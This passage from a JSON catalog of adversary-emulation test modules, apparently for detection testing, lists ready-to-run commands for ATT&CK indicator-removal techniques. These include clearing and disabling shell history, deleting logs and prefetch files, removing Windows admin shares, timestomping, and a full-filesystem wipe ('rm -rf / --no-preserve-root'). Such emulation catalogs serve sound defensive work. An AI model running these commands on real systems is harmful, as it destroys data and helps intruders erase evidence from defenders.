      "rx_module_id": "cbf506a5-dd78-43e5-be7e-a46b7c7a0a11",
      "module_name": "Clear Bash history (echo)"
    },
    {
      "index": 438,
      "technique_id": "T1070.003",
      "technique_name": "Indicator Removal on Host: Clear Command History",
      "description": "Clears bash history via cat /dev/null\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "cat /dev/null > #{history_path}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "history_path",
          "description": "Bash history path",
          "type": "path",
          "default_value": "~/.bash_history"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "b1251c35-dcd3-4ea1-86da-36d27b54f31f",
      "module_name": "Clear Bash history (cat dev/null)"
    },
    {
      "index": 439,
      "technique_id": "T1070.003",
      "technique_name": "Indicator Removal on Host: Clear Command History",
      "description": "Clears bash history via a symlink to /dev/null\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "ln -sf /dev/null #{history_path}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "history_path",
          "description": "Bash history path",
          "type": "path",
          "default_value": "~/.bash_history"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "23d348f3-cc5c-4ba9-bd0a-ae09069f0914",
      "module_name": "Clear Bash history (ln dev/null)"
    },
    {
      "index": 440,
      "technique_id": "T1070.003",
      "technique_name": "Indicator Removal on Host: Clear Command History",
      "description": "Clears bash history via truncate\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "truncate -s0 #{history_path}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "history_path",
          "description": "Bash history path",
          "type": "path",
          "default_value": "~/.bash_history"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "47966a1d-df4f-4078-af65-db6d9aa20739",
      "module_name": "Clear Bash history (truncate)"
    },
    {
      "index": 441,
      "technique_id": "T1070.003",
      "technique_name": "Indicator Removal on Host: Clear Command History",
      "description": "Clears the history of a bunch of different shell types by setting the history size to zero\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "unset HISTFILE\nexport HISTFILESIZE=0\nhistory -c\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "7e6721df-5f08-4370-9255-f06d8a77af4c",
      "module_name": "Clear history of a bunch of shells"
    },
    {
      "index": 442,
      "technique_id": "T1070.003",
      "technique_name": "Indicator Removal on Host: Clear Command History",
      "description": "Clears the history and disable bash history logging of the current shell and future shell sessions\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "bash",
        "command": "set +o history\necho 'set +o history' >> ~/.bashrc\n. ~/.bashrc\nhistory -c\n",
        "elevation_required": false,
        "cleanup_command": "sed -i 's/set +o history//g' ~/.bashrc\n. ~/.bashrc\nset -o history\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "784e4011-bd1a-4ecd-a63a-8feb278512e6",
      "module_name": "Clear and Disable Bash History Logging"
    },
    {
      "index": 443,
      "technique_id": "T1070.003",
      "technique_name": "Indicator Removal on Host: Clear Command History",
      "description": "Using a space before a command causes the command to not be logged in the Bash History file\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "hostname\nwhoami\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "53b03a54-4529-4992-852d-a00b4b7215a6",
      "module_name": "Use Space Before Command to Avoid Logging to History"
    },
    {
      "index": 444,
      "technique_id": "T1070.003",
      "technique_name": "Indicator Removal on Host: Clear Command History",
      "description": "Keeps history clear and stays out of lastlog,wtmp,btmp ssh -T keeps the ssh client from catching a proper TTY, which is what usually gets logged on lastlog\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "sshpass -p 'pwd101!' ssh testuser1@localhost -T hostname\n",
        "elevation_required": false,
        "cleanup_command": "[ \"$(uname)\" = 'FreeBSD' ] && rmuser -y testuser1 || userdel -f testuser1\n"
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Install sshpass and create user account used for excuting\n",
          "check_command": "$(getent passwd testuser1 >/dev/null) && $(which sshpass >/dev/null)\n",
          "install_command": "[ \"$(uname)\" = 'FreeBSD' ] && pw useradd testuser1 -g wheel -s /bin/sh || /usr/sbin/useradd testuser1\n[ \"$(uname)\" = 'FreeBSD' ] && echo 'pwd101!' | pw mod user testuser1 -h 0 || echo -e 'pwd101!\\npwd101!' | passwd testuser1\n(which yum && yum -y install epel-release sshpass)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y sshpass)||(which pkg && pkg install -y sshpass)\n"
        }
      ],
      "rx_module_id": "5f8abd62-f615-43c5-b6be-f780f25790a1",
      "module_name": "Disable Bash History Logging with SSH -T"
    },
    {
      "index": 445,
      "technique_id": "T1070.003",
      "technique_name": "Indicator Removal on Host: Clear Command History",
      "description": "Clears Docker container logs using the Docker CLI and the truncate command, removing all log entries.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "bash",
        "command": "docker container prune -f && sudo truncate -s 0 /var/lib/docker/containers/*/*-json.log\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "553b39f9-1e8c-47b1-abf5-8daf7b0391e9",
      "module_name": "Clear Docker Container Logs"
    },
    {
      "index": 446,
      "technique_id": "T1070.003",
      "technique_name": "Indicator Removal on Host: Clear Command History",
      "description": "Prevents Powershell history\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Set-PSReadlineOption -HistorySaveStyle SaveNothing\n",
        "elevation_required": false,
        "cleanup_command": "Set-PSReadLineOption -HistorySaveStyle SaveIncrementally"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "2f898b81-3e97-4abb-bc3f-a95138988370",
      "module_name": "Prevent Powershell History Logging"
    },
    {
      "index": 447,
      "technique_id": "T1070.003",
      "technique_name": "Indicator Removal on Host: Clear Command History",
      "description": "Clears Powershell history\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Remove-Item (Get-PSReadlineOption).HistorySavePath\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "da75ae8d-26d6-4483-b0fe-700e4df4f037",
      "module_name": "Clear Powershell History by Deleting History File"
    },
    {
      "index": 448,
      "technique_id": "T1070.003",
      "technique_name": "Indicator Removal on Host: Clear Command History",
      "description": "The \"AddToHistoryHandler\" receives the current command as the $line variable and then returns $true if \nthe line should be written to the history file. Here we simply return $false so nothing gets added to \nthe history file for the current session. \n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Set-PSReadLineOption -AddToHistoryHandler { return $false }\n",
        "elevation_required": false,
        "cleanup_command": "Set-PSReadLineOption -AddToHistoryHandler $null\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "1d0d9aa6-6111-4f89-927b-53e8afae7f94",
      "module_name": "Set Custom AddToHistoryHandler to Avoid History File Logging"
    },
    {
      "index": 449,
      "technique_id": "T1070.003",
      "technique_name": "Indicator Removal on Host: Clear Command History",
      "description": "This technique involves using the Clear-History cmdlet in PowerShell to remove all records of previously executed commands.\nThis action is often performed by attackers to eliminate traces of their activities, making incident detection and forensic \ninvestigation more challenging. By clearing the session history, adversaries aim to obfuscate their operational footprint.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Clear-History\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "22c779cd-9445-4d3e-a136-f75adbf0315f",
      "module_name": "Clear PowerShell Session History"
    },
    {
      "index": 450,
      "technique_id": "T1070.004",
      "technique_name": "Indicator Removal on Host: File Deletion",
      "description": "Delete a single file from the temporary directory\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "rm -f #{file_to_delete}\n",
        "elevation_required": false,
        "cleanup_command": "rm -rf #{parent_folder}\n"
      },
      "variables": [
        {
          "name": "parent_folder",
          "description": "Path of parent folder",
          "type": "path",
          "default_value": "/tmp/victim-files/"
        },
        {
          "name": "file_to_delete",
          "description": "Path of file to delete",
          "type": "path",
          "default_value": "/tmp/victim-files/T1070.004-test.txt"
        }
      ],
      "prerequisites": [
        {
          "description": "The file must exist in order to be deleted\n",
          "check_command": "test -e #{file_to_delete} && exit 0 || exit 1\n",
          "install_command": "mkdir -p #{parent_folder} && touch #{file_to_delete}\n"
        }
      ],
      "rx_module_id": "562d737f-2fc6-4b09-8c2a-7f8ff0828480",
      "module_name": "Delete a single file - FreeBSD/Linux/macOS"
    },
    {
      "index": 451,
      "technique_id": "T1070.004",
      "technique_name": "Indicator Removal on Host: File Deletion",
      "description": "Recursively delete the temporary directory and all files contained within it\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "rm -rf #{folder_to_delete}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "folder_to_delete",
          "description": "Path of folder to delete",
          "type": "path",
          "default_value": "/tmp/victim-folder"
        }
      ],
      "prerequisites": [
        {
          "description": "The folder must exist in order to be deleted\n",
          "check_command": "test -e #{folder_to_delete} && exit 0 || exit 1\n",
          "install_command": "mkdir -p #{folder_to_delete}\n"
        }
      ],
      "rx_module_id": "a415f17e-ce8d-4ce2-a8b4-83b674e7017e",
      "module_name": "Delete an entire folder - FreeBSD/Linux/macOS"
    },
    {
      "index": 452,
      "technique_id": "T1070.004",
      "technique_name": "Indicator Removal on Host: File Deletion",
      "description": "Use the `shred` command to overwrite the temporary file and then delete it\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "shred -u #{file_to_shred}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "file_to_shred",
          "description": "Path of file to shred",
          "type": "path",
          "default_value": "/tmp/victim-shred.txt"
        }
      ],
      "prerequisites": [
        {
          "description": "Check if file already exists\n",
          "check_command": "if [ -f \"#{file_to_shred}\" ]; then echo \"File already exists\"; else echo \"File does NOT exist yet\"; exit 1; fi\n",
          "install_command": "touch #{file_to_shred}\n"
        }
      ],
      "rx_module_id": "039b4b10-2900-404b-b67f-4b6d49aa6499",
      "module_name": "Overwrite and delete a file with shred"
    },
    {
      "index": 453,
      "technique_id": "T1070.004",
      "technique_name": "Indicator Removal on Host: File Deletion",
      "description": "Delete a single file from the temporary directory using cmd.exe.\nUpon execution, no output will be displayed. Use File Explorer to verify the file was deleted.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "del /f #{file_to_delete}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "file_to_delete",
          "description": "File to delete. Run the prereq command to create it if it does not exist.",
          "type": "string",
          "default_value": "%temp%\\deleteme_T1551.004"
        }
      ],
      "prerequisites": [
        {
          "description": "The file to delete must exist on disk at specified location (#{file_to_delete})\n",
          "check_command": "IF EXIST \"#{file_to_delete}\" ( EXIT 0 ) ELSE ( EXIT 1 )\n",
          "install_command": "echo deleteme_T1551.004 >> #{file_to_delete}\n"
        }
      ],
      "rx_module_id": "861ea0b4-708a-4d17-848d-186c9c7f17e3",
      "module_name": "Delete a single file - Windows cmd"
    },
    {
      "index": 454,
      "technique_id": "T1070.004",
      "technique_name": "Indicator Removal on Host: File Deletion",
      "description": "Recursively delete a folder in the temporary directory using cmd.exe.\nUpon execution, no output will be displayed. Use File Explorer to verify the folder was deleted.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "rmdir /s /q #{folder_to_delete}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "folder_to_delete",
          "description": "Folder to delete. Run the prereq command to create it if it does not exist.",
          "type": "string",
          "default_value": "%temp%\\deleteme_T1551.004"
        }
      ],
      "prerequisites": [
        {
          "description": "The file to delete must exist on disk at specified location (#{folder_to_delete})\n",
          "check_command": "IF EXIST \"#{folder_to_delete}\" ( EXIT 0 ) ELSE ( EXIT 1 )\n",
          "install_command": "mkdir #{folder_to_delete}\n"
        }
      ],
      "rx_module_id": "ded937c4-2add-42f7-9c2c-c742b7a98698",
      "module_name": "Delete an entire folder - Windows cmd"
    },
    {
      "index": 455,
      "technique_id": "T1070.004",
      "technique_name": "Indicator Removal on Host: File Deletion",
      "description": "Delete a single file from the temporary directory using Powershell. Upon execution, no output will be displayed. Use File Explorer to verify the file was deleted.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Remove-Item -path #{file_to_delete}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "file_to_delete",
          "description": "File to delete. Run the prereq command to create it if it does not exist.",
          "type": "string",
          "default_value": "$env:TEMP\\deleteme_T1551.004"
        }
      ],
      "prerequisites": [
        {
          "description": "The file to delete must exist on disk at specified location (#{file_to_delete})\n",
          "check_command": "if (Test-Path #{file_to_delete}) {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Path #{file_to_delete} | Out-Null\n"
        }
      ],
      "rx_module_id": "9dee89bd-9a98-4c4f-9e2d-4256690b0e72",
      "module_name": "Delete a single file - Windows PowerShell"
    },
    {
      "index": 456,
      "technique_id": "T1070.004",
      "technique_name": "Indicator Removal on Host: File Deletion",
      "description": "Recursively delete a folder in the temporary directory using Powershell. Upon execution, no output will be displayed. Use File Explorer to verify the folder was deleted.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Remove-Item -Path #{folder_to_delete} -Recurse\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "folder_to_delete",
          "description": "Folder to delete. Run the prereq command to create it if it does not exist.",
          "type": "string",
          "default_value": "$env:TEMP\\deleteme_folder_T1551.004"
        }
      ],
      "prerequisites": [
        {
          "description": "The folder to delete must exist on disk at specified location (#{folder_to_delete})\n",
          "check_command": "if (Test-Path #{folder_to_delete}) {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Path #{folder_to_delete} -Type Directory | Out-Null\n"
        }
      ],
      "rx_module_id": "edd779e4-a509-4cba-8dfa-a112543dbfb1",
      "module_name": "Delete an entire folder - Windows PowerShell"
    },
    {
      "index": 457,
      "technique_id": "T1070.004",
      "technique_name": "Indicator Removal on Host: File Deletion",
      "description": "This test deletes the entire root filesystem of a Linux system. This technique was used by Amnesia IoT malware to avoid analysis. This test is dangerous and destructive, do NOT use on production equipment.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "[ \"$(uname)\" = 'Linux' ] && rm -rf / --no-preserve-root > /dev/null 2> /dev/null || chflags -R 0 / && rm -rf / > /dev/null 2> /dev/null\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "f3aa95fe-4f10-4485-ad26-abf22a764c52",
      "module_name": "Delete Filesystem - Linux"
    },
    {
      "index": 458,
      "technique_id": "T1070.004",
      "technique_name": "Indicator Removal on Host: File Deletion",
      "description": "Delete a single prefetch file.  Deletion of prefetch files is a known anti-forensic technique. To verify execution, Run `(Get-ChildItem -Path \"$Env:SystemRoot\\prefetch\\*.pf\" | Measure-Object).Count`\nbefore and after the test to verify that the number of prefetch files decreases by 1.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Remove-Item -Path (Join-Path \"$Env:SystemRoot\\prefetch\\\" (Get-ChildItem -Path \"$Env:SystemRoot\\prefetch\\*.pf\" -Name)[0])\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "36f96049-0ad7-4a5f-8418-460acaeb92fb",
      "module_name": "Delete Prefetch File"
    },
    {
      "index": 459,
      "technique_id": "T1070.004",
      "technique_name": "Indicator Removal on Host: File Deletion",
      "description": "Adversaries may delete TeamViewer log files to hide activity. This should provide a high true-positive alert ration.\nThis test just places the files in a non-TeamViewer folder, a detection would just check for a deletion event matching the TeamViewer\nlog file format of TeamViewer_##.log. Upon execution, no output will be displayed. Use File Explorer to verify the folder was deleted.\n\nhttps://twitter.com/SBousseaden/status/1197524463304290305?s=20\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "New-Item -Path #{teamviewer_log_file} -Force | Out-Null\nRemove-Item #{teamviewer_log_file} -Force -ErrorAction Ignore\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "teamviewer_log_file",
          "description": "Teamviewer log file to create and delete.",
          "type": "string",
          "default_value": "$env:TEMP\\TeamViewer_54.log"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "69f50a5f-967c-4327-a5bb-e1a9a9983785",
      "module_name": "Delete TeamViewer Log Files"
    },
    {
      "index": 460,
      "technique_id": "T1070.004",
      "technique_name": "Indicator Removal on Host: File Deletion",
      "description": "An adversary clears the recycle bin in the system partition using rd to remove traces of deleted files.\n[Reference](https://thedfirreport.com/2024/08/12/threat-actors-toolkit-leveraging-sliver-poshc2-batch-scripts/)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "rd /s /q %systemdrive%\\$RECYCLE.BIN\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "f723d13d-48dc-4317-9990-cf43a9ac0bf2",
      "module_name": "Clears Recycle bin via rd"
    },
    {
      "index": 461,
      "technique_id": "T1070.005",
      "technique_name": "Indicator Removal on Host: Network Share Connection Removal",
      "description": "Add a Network Share utilizing the command_prompt\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "net use c: #{share_name}\nnet share test=#{share_name} /REMARK:\"test share\" /CACHE:No\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "share_name",
          "description": "Share to add.",
          "type": "string",
          "default_value": "\\\\test\\share"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "14c38f32-6509-46d8-ab43-d53e32d2b131",
      "module_name": "Add Network Share"
    },
    {
      "index": 462,
      "technique_id": "T1070.005",
      "technique_name": "Indicator Removal on Host: Network Share Connection Removal",
      "description": "Removes a Network Share utilizing the command_prompt\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "net share #{share_name} /delete\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "share_name",
          "description": "Share to remove.",
          "type": "string",
          "default_value": "\\\\test\\share"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "09210ad5-1ef2-4077-9ad3-7351e13e9222",
      "module_name": "Remove Network Share"
    },
    {
      "index": 463,
      "technique_id": "T1070.005",
      "technique_name": "Indicator Removal on Host: Network Share Connection Removal",
      "description": "Removes a Network Share utilizing PowerShell\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Remove-SmbShare -Name #{share_name}\nRemove-FileShare -Name #{share_name}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "share_name",
          "description": "Share to remove.",
          "type": "string",
          "default_value": "\\\\test\\share"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "0512d214-9512-4d22-bde7-f37e058259b3",
      "module_name": "Remove Network Share PowerShell"
    },
    {
      "index": 464,
      "technique_id": "T1070.005",
      "technique_name": "Indicator Removal on Host: Network Share Connection Removal",
      "description": "Administrative shares are hidden network shares created by Microsofts Windows NT operating systems that grant system administrators \nremote access to every disk volume on a network-connected system. These shares are automatically created at started unless they have been\npurposefully disabled as is done in this RAGLOX test. As Microsoft puts it, \"Missing administrative shares typically \nindicate that the computer in question has been compromised by malicious software.\"\nhttps://threatpost.com/conti-ransomware-gang-has-full-log4shell-attack-chain/177173/\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" /v AutoShareServer /t REG_DWORD /d 0 /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" /v AutoShareWks /t REG_DWORD /d 0 /f\n",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" /v AutoShareServer /f\nreg delete \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" /v AutoShareWks /f\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "99c657aa-ebeb-4179-a665-69288fdd12b8",
      "module_name": "Disable Administrative Share Creation at Startup"
    },
    {
      "index": 465,
      "technique_id": "T1070.005",
      "technique_name": "Indicator Removal on Host: Network Share Connection Removal",
      "description": "Administrative shares are hidden network shares created by Microsofts Windows NT operating systems that grant system administrators \nremote access to every disk volume on a network-connected system. As Microsoft puts it, Missing administrative shares typically \nindicate that the computer in question has been compromised by malicious software.\nhttps://threatpost.com/conti-ransomware-gang-has-full-log4shell-attack-chain/177173/\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "for %i in (C$ IPC$ ADMIN$) do net share %i /delete",
        "elevation_required": true,
        "cleanup_command": "net share ADMIN$ /UNLIMITED >nul 2>&1\nnet share C$=C:\\ >nul 2>&1\nnet share IPC$ >nul 2>&1\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "4299eff5-90f1-4446-b2f3-7f4f5cfd5d62",
      "module_name": "Remove Administrative Shares"
    },
    {
      "index": 466,
      "technique_id": "T1070.006",
      "technique_name": "Indicator Removal on Host: Timestomp",
      "description": "Stomps on the access timestamp of a file\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "touch -a -t 197001010000.00 #{target_filename}\n",
        "elevation_required": false,
        "cleanup_command": "rm -f #{target_filename}\n"
      },
      "variables": [
        {
          "name": "target_filename",
          "description": "Path of file that we are going to stomp on last access time",
          "type": "path",
          "default_value": "/tmp/T1070.006-access.txt"
        }
      ],
      "prerequisites": [
        {
          "description": "The file must exist in order to be timestomped\n",
          "check_command": "test -e #{target_filename} && exit 0 || exit 1\n",
          "install_command": "echo 'T1070.006 file access timestomp test' > #{target_filename}\n"
        }
      ],
      "rx_module_id": "5f9113d5-ed75-47ed-ba23-ea3573d05810",
      "module_name": "Set a file's access timestamp"
    },
    {
      "index": 467,
      "technique_id": "T1070.006",
      "technique_name": "Indicator Removal on Host: Timestomp",
      "description": "Stomps on the modification timestamp of a file\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "touch -m -t 197001010000.00 #{target_filename}\n",
        "elevation_required": false,
        "cleanup_command": "rm -f #{target_filename}\n"
      },
      "variables": [
        {
          "name": "target_filename",
          "description": "Path of file that we are going to stomp on last access time",
          "type": "path",
          "default_value": "/tmp/T1070.006-modification.txt"
        }
      ],
      "prerequisites": [
        {
          "description": "The file must exist in order to be timestomped\n",
          "check_command": "test -e #{target_filename} && exit 0 || exit 1\n",
          "install_command": "echo 'T1070.006 file modification timestomp test' > #{target_filename}\n"
        }
      ],
      "rx_module_id": "20ef1523-8758-4898-b5a2-d026cc3d2c52",
      "module_name": "Set a file's modification timestamp"
    },
    {
      "index": 468,
      "technique_id": "T1070.006",
      "technique_name": "Indicator Removal on Host: Timestomp",
      "description": "Stomps on the create timestamp of a file\n\nSetting the creation timestamp requires changing the system clock and reverting.\nSudo or root privileges are required to change date. Use with caution.\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "NOW=$(date +%m%d%H%M%Y)\ndate 010100001971\ntouch #{target_filename}\ndate \"$NOW\"\nstat #{target_filename}\n",
        "elevation_required": true,
        "cleanup_command": "rm -f #{target_filename}\n"
      },
      "variables": [
        {
          "name": "target_filename",
          "description": "Path of file that we are going to stomp on last access time",
          "type": "path",
          "default_value": "/tmp/T1070.006-creation.txt"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "8164a4a6-f99c-4661-ac4f-80f5e4e78d2b",
      "module_name": "Set a file's creation timestamp"
    },
    {
      "index": 469,
      "technique_id": "T1070.006",
      "technique_name": "Indicator Removal on Host: Timestomp",
      "description": "Modifies the `modify` and `access` timestamps using the timestamps of a specified reference file.\n\nThis technique was used by the threat actor Rocke during the compromise of Linux web servers.\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "touch #{target_file_path}\ntouch -acmr #{reference_file_path} #{target_file_path}\n",
        "elevation_required": false,
        "cleanup_command": "rm -f #{target_file_path}\n"
      },
      "variables": [
        {
          "name": "target_file_path",
          "description": "Path of file to modify timestamps of",
          "type": "path",
          "default_value": "/tmp/T1070.006-reference.txt"
        },
        {
          "name": "reference_file_path",
          "description": "Path of reference file to read timestamps from",
          "type": "path",
          "default_value": "/bin/sh"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "631ea661-d661-44b0-abdb-7a7f3fc08e50",
      "module_name": "Modify file timestamps using reference file"
    },
    {
      "index": 470,
      "technique_id": "T1070.006",
      "technique_name": "Indicator Removal on Host: Timestomp",
      "description": "Modifies the file creation timestamp of a specified file. This technique was seen in use by the Stitch RAT.\nTo verify execution, use File Explorer to view the Properties of the file and observe that the Created time is the year 1970.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Get-ChildItem \"#{file_path}\" | % { $_.CreationTime = \"#{target_date_time}\" }\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "target_date_time",
          "description": "Date/time to replace original timestamps with",
          "type": "string",
          "default_value": "01/01/1970 00:00:00"
        },
        {
          "name": "file_path",
          "description": "Path of file to change creation timestamp",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\T1551.006_timestomp.txt"
        }
      ],
      "prerequisites": [
        {
          "description": "A file must exist at the path (#{file_path}) to change the creation time on\n",
          "check_command": "if (Test-Path \"#{file_path}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Path \"#{file_path}\" -Force | Out-Null\nSet-Content \"#{file_path}\" -Value \"T1551.006 Timestomp\" -Force | Out-Null\n"
        }
      ],
      "rx_module_id": "b3b2c408-2ff0-4a33-b89b-1cb46a9e6a9c",
      "module_name": "Windows - Modify file creation timestamp with PowerShell"
    },
    {
      "index": 471,
      "technique_id": "T1070.006",
      "technique_name": "Indicator Removal on Host: Timestomp",
      "description": "Modifies the file last modified timestamp of a specified file. This technique was seen in use by the Stitch RAT.\nTo verify execution, use File Explorer to view the Properties of the file and observe that the Modified time is the year 1970.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Get-ChildItem \"#{file_path}\" | % { $_.LastWriteTime = \"#{target_date_time}\" }\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "target_date_time",
          "description": "Date/time to replace original timestamps with",
          "type": "string",
          "default_value": "01/01/1970 00:00:00"
        },
        {
          "name": "file_path",
          "description": "Path of file to change modified timestamp",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\T1551.006_timestomp.txt"
        }
      ],
      "prerequisites": [
        {
          "description": "A file must exist at the path (#{file_path}) to change the modified time on\n",
          "check_command": "if (Test-Path \"#{file_path}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Path \"#{file_path}\" -Force | Out-Null\nSet-Content \"#{file_path}\" -Value \"T1551.006 Timestomp\" -Force | Out-Null\n"
        }
      ],
      "rx_module_id": "f8f6634d-93e1-4238-8510-f8a90a20dcf2",
      "module_name": "Windows - Modify file last modified timestamp with PowerShell"
    },
    {
      "index": 472,
      "technique_id": "T1070.006",
      "technique_name": "Indicator Removal on Host: Timestomp",
      "description": "Modifies the last access timestamp of a specified file. This technique was seen in use by the Stitch RAT.\nTo verify execution, use File Explorer to view the Properties of the file and observe that the Accessed time is the year 1970.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Get-ChildItem \"#{file_path}\" | % { $_.LastAccessTime = \"#{target_date_time}\" }\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "target_date_time",
          "description": "Date/time to replace original timestamps with",
          "type": "string",
          "default_value": "01/01/1970 00:00:00"
        },
        {
          "name": "file_path",
          "description": "Path of file to change last access timestamp",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\T1551.006_timestomp.txt"
        }
      ],
      "prerequisites": [
        {
          "description": "A file must exist at the path (\"#{file_path}\") to change the last access time on\n",
          "check_command": "if (Test-Path \"#{file_path}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Path \"#{file_path}\" -Force | Out-Null\nSet-Content \"#{file_path}\" -Value \"T1551.006 Timestomp\" -Force | Out-Null\n"
        }
      ],
      "rx_module_id": "da627f63-b9bd-4431-b6f8-c5b44d061a62",
      "module_name": "Windows - Modify file last access timestamp with PowerShell"
    },
    {
      "index": 473,
      "technique_id": "T1070.006",
      "technique_name": "Indicator Removal on Host: Timestomp",
